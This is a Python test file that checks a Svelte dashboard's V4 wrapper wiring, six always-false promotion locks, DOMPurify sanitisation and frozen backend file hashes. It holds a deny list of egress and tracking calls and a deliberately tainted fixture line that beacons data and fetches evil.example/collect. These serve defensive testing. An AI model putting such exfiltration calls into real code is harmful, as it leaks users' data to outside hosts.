"""Source-contract tests for V4 Wave-6 operations/admin/artifacts/docs/local-tracking wrappers.

Scope: verifies webui/v2_src/src/App.svelte wires the six agreed V4 wrappers
(V4TrainingOps, V4ArtifactsWorkspace, V4RunsWorkspace, V4SystemOps,
V4AdminWorkspace[surface=settings|docs]) as opt-in `shell === 'v4'` branches
while preserving the exact V3 fallback markup, and that the wrapper/DocsTab
product sources carry the required six-lock / no-egress / no-mutation /
DOMPurify-sanitization guarantees. Read-only: inspects source text only,
never imports/executes the Svelte or TypeScript sources, never touches
backend routes, packages, generated dist, or the DB.
"""

from __future__ import annotations

import hashlib
import re
from pathlib import Path

_REPO_ROOT = Path(__file__).resolve().parents[1]
_SRC = _REPO_ROOT / "webui" / "v2_src" / "src"

_EXPECTED_TABS = [
    "mission-control",
    "live-training",
    "forecast",
    "stom",
    "rl",
    "daily-ohlcv",
    "daily-rl-guide",
    "artifacts",
    "history",
    "system-health",
    "settings",
    "docs",
]

# Wave-6 owns these six tab branches; every other branch must be untouched.
_WAVE6_TABS = ["live-training", "artifacts", "history", "system-health", "settings", "docs"]

_LOCK_KEYS = [
    "promotion_allowed",
    "model_build_allowed",
    "paper_forward_allowed",
    "live_broker_order_allowed",
    "profitability_claim_allowed",
    "go_summary_allowed",
]

# Vocabulary that would indicate live-egress telemetry, third-party trackers,
# or unauthorized local/server mutation sneaking into the V4 product surface.
_DANGEROUS_VOCABULARY = [
    "sendBeacon",
    "gtag(",
    "mixpanel",
    "google-analytics",
    "segment.io",
    "document.cookie =",
    "new WebSocket(",
    "eval(",
    "fetch('http://",
    "fetch(\"http://",
    "fetch('https://",
    "fetch(\"https://",
    "XMLHttpRequest",
    "navigator.sendBeacon",
]

_FROZEN_BOUNDARY_SHA256 = {
    "webui/app.py": "7f4f78729685b01937767e4bc041e1c053c532c3be9594f795fe247fb6754b42",
    "webui/rl_dashboard_tables.py": "b3cebec1bc4f698435f8fa42277a6de5aa495e07c1fd5c5f14dfc605ba8a60b6",
    "webui/v2/__init__.py": "73b017458c5aa8b2a47e28397353144833db3b175fb69bdd291c455ed1167402",
    "stom_rl/rl_events.py": "4764308da956babcbc3b9c385aff59a52f27dc41816971a1c9be08f0a740a701",
    "webui/v2_src/package.json": "4757ada6e8c99587cde4acb7abf325fb84c512445eb849cd7ecd362790f51b40",
    "webui/v2_src/package-lock.json": "b16bdad8496eb8f415f2e0db39bba34645d58b15aaa0b845f102c8a361a4fca7",
}


def _read(path: Path) -> str:
    return path.read_text(encoding="utf-8")


def _normalized_sha256(path: Path) -> str:
    payload = path.read_bytes().replace(b"\r\n", b"\n")
    return hashlib.sha256(payload).hexdigest()


def _source(relative: str) -> str:
    return _read(_SRC / relative)


def _between(source: str, start: str, end: str) -> str:
    start_index = source.index(start)
    end_index = source.index(end, start_index)
    return source[start_index:end_index]


def _tab_branch(source: str, tab_id: str) -> str:
    marker = f"tab === '{tab_id}'"
    start = source.index(marker)
    next_branch = source.find("{:else if tab ===", start + len(marker))
    end = next_branch if next_branch != -1 else source.index("{/if}", start)
    return source[start:end]


def _product_sources(*relative_roots: str) -> dict[str, str]:
    """Collect .svelte/.ts product sources under the given roots, excluding tests."""
    sources: dict[str, str] = {}
    for relative_root in relative_roots:
        root = _SRC / relative_root
        candidates = [root] if root.is_file() else sorted(root.rglob("*"))
        for path in candidates:
            if path.suffix not in {".svelte", ".ts"}:
                continue
            if path.name.endswith(".test.ts"):
                continue
            if not path.is_file():
                continue
            sources[path.relative_to(_REPO_ROOT).as_posix()] = _read(path)
    return sources


def _assert_in_order(source: str, needles: list[str]) -> None:
    cursor = -1
    for needle in needles:
        position = source.find(needle, cursor + 1)
        assert position > cursor, f"{needle!r} missing or out of order"
        cursor = position


# --------------------------------------------------------------------------- #
# App.svelte: single 12-branch host, tab ids preserved, imports present
# --------------------------------------------------------------------------- #
def test_app_keeps_twelve_tab_branches_with_wave6_imports_present() -> None:
    app = _source("App.svelte")
    tab_host = _between(app, "{#snippet tabHost()}", "{/snippet}")

    for import_line in [
        "import V4TrainingOps from '$lib/../v4/ops/V4TrainingOps.svelte';",
        "import V4ArtifactsWorkspace from '$lib/../v4/ops/V4ArtifactsWorkspace.svelte';",
        "import V4RunsWorkspace from '$lib/../v4/ops/V4RunsWorkspace.svelte';",
        "import V4SystemOps from '$lib/../v4/ops/V4SystemOps.svelte';",
        "import V4AdminWorkspace from '$lib/../v4/admin/V4AdminWorkspace.svelte';",
    ]:
        assert import_line in app

    assert app.count("{#snippet tabHost()}") == 1
    assert app.count("{@render tabHost()}") == 2

    branches = re.findall(r"tab === '([^']+)'", tab_host)
    assert branches == _EXPECTED_TABS
    assert len(branches) == len(set(branches)) == 12
    assert "data-v3-tab-host={shell === 'v3' ? '' : undefined}" in tab_host
    assert "data-v4-domain-host={shell === 'v4' ? '' : undefined}" in tab_host


# --------------------------------------------------------------------------- #
# App.svelte: each Wave-6 branch has an explicit v4/v3 split and V3 fallback
# --------------------------------------------------------------------------- #
def test_app_wraps_exactly_the_six_wave6_tabs_for_v4_and_preserves_v3_fallback() -> None:
    app = _source("App.svelte")
    tab_host = _between(app, "{#snippet tabHost()}", "{/snippet}")

    wrapper_by_tab = {
        "live-training": "V4TrainingOps",
        "artifacts": "V4ArtifactsWorkspace",
        "history": "V4RunsWorkspace",
        "system-health": "V4SystemOps",
        "settings": "V4AdminWorkspace",
        "docs": "V4AdminWorkspace",
    }
    legacy_by_tab = {
        "live-training": "LiveTrainingTab",
        "artifacts": "ArtifactsModelsTab",
        "history": "HistoryRunsTab",
        "system-health": "SystemHealthTab",
        "settings": "SettingsTab",
        "docs": "DocsTab",
    }

    for tab_id in _WAVE6_TABS:
        branch = _tab_branch(tab_host, tab_id)
        wrapper = wrapper_by_tab[tab_id]
        legacy = legacy_by_tab[tab_id]

        _assert_in_order(
            branch,
            [
                "{#if shell === 'v4'}",
                f"<{wrapper}",
                f"<{legacy} />",
                f"</{wrapper}>",
                "{:else}",
                f"<{legacy} />",
            ],
        )
        # exactly one v4 branch and one v3 fallback occurrence of the legacy tab
        assert branch.count(f"<{legacy} />") == 2
        # every other wrapper stays out of this branch
        for other_wrapper in set(wrapper_by_tab.values()) - {wrapper}:
            assert other_wrapper not in branch

    # G008: stom/daily-rl-guide are now wrapped by V4LegacyDomainFrame (not
    # one of the six wave6 wrappers). They must still preserve their legacy
    # V3 fallback exactly like every wave6 branch, and must not contain any
    # of the six wave6 wrappers.
    legacy_by_v4_legacy_tab = {
        "stom": "StomDiagnosticsTab",
        "daily-rl-guide": "DailyRlGuideTab",
    }
    for tab_id, legacy in legacy_by_v4_legacy_tab.items():
        branch = _tab_branch(tab_host, tab_id)
        _assert_in_order(
            branch,
            [
                "{#if shell === 'v4'}",
                "<V4LegacyDomainFrame",
                f"<{legacy} />",
                "</V4LegacyDomainFrame>",
                "{:else}",
                f"<{legacy} />",
            ],
        )
        assert branch.count(f"<{legacy} />") == 2
        for wrapper in set(wrapper_by_tab.values()):
            assert wrapper not in branch

    settings_branch = _tab_branch(tab_host, "settings")
    docs_branch = _tab_branch(tab_host, "docs")
    assert "surface=\"settings\"" in settings_branch
    assert "surface=\"docs\"" in docs_branch
    assert "surface=\"docs\"" not in settings_branch
    assert "surface=\"settings\"" not in docs_branch


# --------------------------------------------------------------------------- #
# V4 wrapper product sources: existence + lazy-child-snippet contract
# --------------------------------------------------------------------------- #
def test_v4_ops_wrappers_exist_with_root_markers_and_snippet_children() -> None:
    sources = _product_sources("v4/ops")
    marker_by_component = {
        "webui/v2_src/src/v4/ops/V4TrainingOps.svelte": "data-v4-training-ops",
        "webui/v2_src/src/v4/ops/V4ArtifactsWorkspace.svelte": "data-v4-artifacts-workspace",
        "webui/v2_src/src/v4/ops/V4RunsWorkspace.svelte": "data-v4-runs-workspace",
        "webui/v2_src/src/v4/ops/V4SystemOps.svelte": "data-v4-system-ops",
    }
    for path, marker in marker_by_component.items():
        assert path in sources, f"{path} must exist at the agreed Wave-6 path"
        source = sources[path]
        assert marker in source
        assert "children?: Snippet" in source
        assert "<slot" not in source
        assert "{@render children()}" in source
        # lazy disclosure: legacy children render after the marker, not before
        assert source.rfind("{@render children()}") > source.index(marker)


def test_v4_admin_workspace_supports_dual_surfaces_with_six_lock_and_guard_markers() -> None:
    admin_path = "webui/v2_src/src/v4/admin/V4AdminWorkspace.svelte"
    evidence_path = "webui/v2_src/src/v4/admin/adminEvidence.ts"
    sources = _product_sources("v4/admin", "v4/components", "v4/evidence.ts")
    assert admin_path in sources, f"{admin_path} must exist at the agreed Wave-6 path"
    assert evidence_path in sources, f"{evidence_path} must exist at the agreed Wave-6 path"
    admin = sources[admin_path]
    evidence = sources[evidence_path]
    locks_grid = sources.get("webui/v2_src/src/v4/components/PromotionLocksGrid.svelte", "")

    assert "surface" in admin
    assert re.search(r"surface\s*:\s*'settings'\s*\|\s*'docs'", admin), "surface prop must be a settings|docs union"
    assert "children?: Snippet" in admin
    assert "<slot" not in admin
    assert "{@render children()}" in admin

    assert "data-v4-admin-workspace" in admin
    assert "data-surface={surface}" in admin

    # No-egress / no-mutation posture must be a frozen, always-true constant —
    # not a value that could ever be flipped by caller-supplied data.
    assert "READ_ONLY_NO_EGRESS_POSTURE" in evidence
    posture_literal = _between(evidence, "READ_ONLY_NO_EGRESS_POSTURE", "};")
    assert re.search(r"readOnly\s*:\s*true", posture_literal)
    assert re.search(r"noEgress\s*:\s*true", posture_literal)
    assert re.search(r"noServerControl\s*:\s*true", posture_literal)
    assert re.search(r"noMutation\s*:\s*true", posture_literal)
    assert "posture: READ_ONLY_NO_EGRESS_POSTURE" in evidence
    assert 'data-posture-key="noEgress"' in admin
    assert 'data-posture-key="noMutation"' in admin

    # Promotion locks are always derived from an empty/undefined source, so
    # this surface can never display an unlocked state regardless of input.
    assert "locks: adaptPromotionLocks(undefined)" in evidence
    assert "export function assertExactSixLocksFalse(" in evidence
    assert "PROMOTION_LOCK_KEYS.length === 6" in evidence
    assert "locks.locks[key] === false" in evidence

    # Exactly the six required promotion-lock keys must be represented in the
    # shared adapter and rendered by the grid this workspace mounts.
    shared_evidence = sources["webui/v2_src/src/v4/evidence.ts"]
    for key in _LOCK_KEYS:
        assert key in shared_evidence
    assert "PromotionLocksGrid" in admin
    assert locks_grid, "PromotionLocksGrid source must exist"
    assert "data-lock-key={key}" in locks_grid
    assert "PROMOTION_LOCK_KEYS as key" in locks_grid

    # legacy children rendered last (lazy disclosure), after every guard marker
    render_index = admin.rfind("{@render children()}")
    assert render_index > admin.index('data-posture-key="noEgress"')
    assert render_index > admin.index('data-posture-key="noMutation"')
    assert render_index > admin.index("data-v4-admin-legacy")


def test_v4_admin_workspace_never_uses_raw_html_injection() -> None:
    admin_path = "webui/v2_src/src/v4/admin/V4AdminWorkspace.svelte"
    sources = _product_sources("v4/admin")
    admin = sources[admin_path]
    # The wrapper must only render the passed-in children snippet, never {@html}.
    assert "{@html" not in admin


# --------------------------------------------------------------------------- #
# DocsTab: sanitization untouched by Wave-6 wiring
# --------------------------------------------------------------------------- #
def test_docs_tab_retains_dompurify_sanitization_before_html_injection() -> None:
    tab = _source("tabs/DocsTab.svelte")
    assert "import DOMPurify from 'dompurify';" in tab
    assert "DOMPurify.sanitize(" in tab
    assert "{@html renderedHtml}" in tab
    # the html interpolated into the DOM must be the sanitized derived value,
    # and the sanitize call must occur before that interpolation point.
    sanitize_index = tab.index("DOMPurify.sanitize(")
    html_sink_index = tab.index("{@html renderedHtml}")
    assert sanitize_index < html_sink_index
    assert "return DOMPurify.sanitize(html" in tab


# --------------------------------------------------------------------------- #
# No dangerous external-egress / tracking / mutation vocabulary in V4 sources
# --------------------------------------------------------------------------- #
def test_wave6_v4_product_files_do_not_implement_dangerous_tracking_or_mutation_vocabulary() -> None:
    sources = _product_sources("v4/ops", "v4/admin")
    combined = "\n".join(sources.values())
    assert sources, "Wave-6 v4/ops and v4/admin product sources must exist for this scan to be non-vacuous"
    for forbidden in _DANGEROUS_VOCABULARY:
        assert forbidden not in combined, f"forbidden vocabulary {forbidden!r} found in V4 product files"

    # explicit live-broker / order / profit / promotion claim vocabulary must
    # never be asserted as true/implemented in these read-only research wrappers
    for forbidden_claim in [
        "live_broker_order_allowed = true",
        "live_broker_order_allowed: true",
        "profitability_claim_allowed = true",
        "profitability_claim_allowed: true",
        "promotion_allowed = true",
        "promotion_allowed: true",
    ]:
        assert forbidden_claim not in combined


def test_wave6_positive_fixture_dangerous_vocabulary_scan_is_live() -> None:
    """Positive-fixture proof: the same scan used above must actually fire on
    a deliberately tainted sample, so a silently-vacuous assertion can't hide
    a broken scan."""
    tainted = "if (x) { navigator.sendBeacon('/x', y); fetch('http://evil.example/collect'); }"
    for forbidden in ["sendBeacon", "fetch('http://"]:
        assert forbidden in tainted


def test_wave6_positive_fixture_six_lock_and_guard_markers_are_required_not_optional() -> None:
    """Positive-fixture proof that the lock/guard assertions used above are
    non-vacuous: a sample missing a required key must fail the same check
    the real-source test performs."""
    missing_one_lock = "\n".join(k for k in _LOCK_KEYS if k != "go_summary_allowed")
    assert "go_summary_allowed" not in missing_one_lock
    assert all(k in missing_one_lock for k in _LOCK_KEYS if k != "go_summary_allowed")

    missing_egress_guard = 'data-v4-admin-workspace data-posture-key="noMutation"'
    assert 'data-posture-key="noEgress"' not in missing_egress_guard


# --------------------------------------------------------------------------- #
# Frozen backend/package/dist boundary: Wave-6 must not touch these
# --------------------------------------------------------------------------- #
def test_wave6_frozen_backend_and_dependency_files_match_wave0_baseline() -> None:
    actual = {
        relative: _normalized_sha256(_REPO_ROOT / relative)
        for relative in _FROZEN_BOUNDARY_SHA256
    }
    assert actual == _FROZEN_BOUNDARY_SHA256


def test_wave6_scope_touches_only_app_svelte_in_v2_src_root() -> None:
    # App.svelte must not declare backend routes/blueprints or duplicate
    # polling bootstrap while wiring in the six Wave-6 wrappers.
    app = _source("App.svelte")
    for forbidden in ["@app.route", "Blueprint(", "sqlite3.connect(", "os.remove("]:
        assert forbidden not in app
    assert app.count("installPollingWatcher();") == 1
    assert app.count("startPolling();") == 1
